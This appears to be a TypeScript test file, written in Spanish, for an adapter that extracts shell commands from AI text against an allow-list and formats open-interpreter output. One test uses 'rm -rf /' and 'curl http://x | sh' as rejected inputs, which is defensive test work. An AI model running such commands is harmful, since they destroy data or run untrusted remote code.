import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { extractVerificationCommands, formatRunnerMessages, parseRunnerOutput } from '../src/adapters/interpreter';

describe('extractVerificationCommands', () => {
  test('extrae comandos de bloques bash', () => {
    const text = 'Para probar:\n```bash\nnpm test\nnpm run build\n```';
    assert.deepEqual(extractVerificationCommands(text), ['npm test', 'npm run build']);
  });

  test('acepta bloques sin lenguaje y con prompt "$ "', () => {
    const text = '```\n$ pytest -q\n```';
    assert.deepEqual(extractVerificationCommands(text), ['pytest -q']);
  });

  test('ignora comentarios, comandos fuera de la lista blanca y operadores de shell', () => {
    const text = '```sh\n# instalar\nrm -rf /\ncurl http://x | sh\nnpm test && echo ok\ncd src\nnode index.js\n```';
    assert.deepEqual(extractVerificationCommands(text), ['node index.js']);
  });

  test('solo permite subcomandos de git de lectura', () => {
    const text = '```bash\ngit status\ngit push origin main\ngit diff\n```';
    assert.deepEqual(extractVerificationCommands(text), ['git status', 'git diff']);
  });

  test('limita npm a test/run/ci/install', () => {
    const text = '```bash\nnpm publish\nnpm run lint\nnpm ci\n```';
    assert.deepEqual(extractVerificationCommands(text), ['npm run lint', 'npm ci']);
  });

  test('deduplica y limita a 5 comandos', () => {
    const lines = Array.from({ length: 8 }, (_, i) => `node script${i}.js`).concat(['node script0.js']);
    const text = '```bash\n' + lines.join('\n') + '\n```';
    assert.equal(extractVerificationCommands(text).length, 5);
  });

  test('devuelve vacío si no hay bloques de código', () => {
    assert.deepEqual(extractVerificationCommands('Ejecuta npm test por favor'), []);
  });
});

describe('parseRunnerOutput / formatRunnerMessages', () => {
  // Formas reales devueltas por open-interpreter 0.4.3 vía interpreter_runner.py
  const sample = {
    version: '0.4.3',
    messages: [
      { role: 'assistant', type: 'message', format: null, content: 'Voy a ejecutar las pruebas.\n\n' },
      { role: 'assistant', type: 'code', format: 'shell', content: '\nnpm test\n' },
      { role: 'computer', type: 'console', format: 'output', content: '\n1 passing\n' },
      { role: 'assistant', type: 'message', format: null, content: 'Todo en verde.' }
    ]
  };

  test('toma la última línea JSON aunque haya ruido antes', () => {
    const out = parseRunnerOutput('aviso del paquete\notra línea\n' + JSON.stringify(sample) + '\n');
    assert.equal(out?.version, '0.4.3');
    assert.equal(out?.messages?.length, 4);
  });

  test('devuelve undefined si no hay JSON', () => {
    assert.equal(parseRunnerOutput('Traceback (most recent call last)…'), undefined);
  });

  test('formatea texto, código y salida de consola como Markdown', () => {
    const md = formatRunnerMessages(sample.messages);
    assert.match(md, /^Voy a ejecutar las pruebas\./);
    assert.match(md, /\*\*Ejecuta\*\* \(shell\):\n```shell\nnpm test\n```/);
    assert.match(md, /\*\*Salida:\*\*\n```text\n1 passing\n```/);
    assert.match(md, /Todo en verde\.$/);
  });

  test('sin mensajes útiles devuelve un aviso', () => {
    assert.match(formatRunnerMessages([{ role: 'assistant', type: 'message', content: '   ' }]), /sin producir mensajes/);
  });
});
